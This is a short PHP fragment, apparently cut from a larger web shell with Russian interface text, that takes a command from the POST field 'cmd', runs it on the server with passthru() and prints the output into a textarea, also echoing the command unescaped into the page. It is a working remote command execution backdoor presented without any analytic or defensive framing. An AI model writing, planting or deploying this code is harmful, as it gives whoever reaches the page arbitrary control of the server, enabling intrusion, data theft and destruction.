<?php
echo "<font face=Verdana size=-2>Выполненная команда: <b>".$_POST['cmd']."</b></font></td></tr><tr><td>";
echo "<b>";
echo "<div align=center><textarea name=report cols=145 rows=20>";
echo "".passthru($_POST['cmd'])."";
echo "</textarea></div>";
echo "</b>";
?>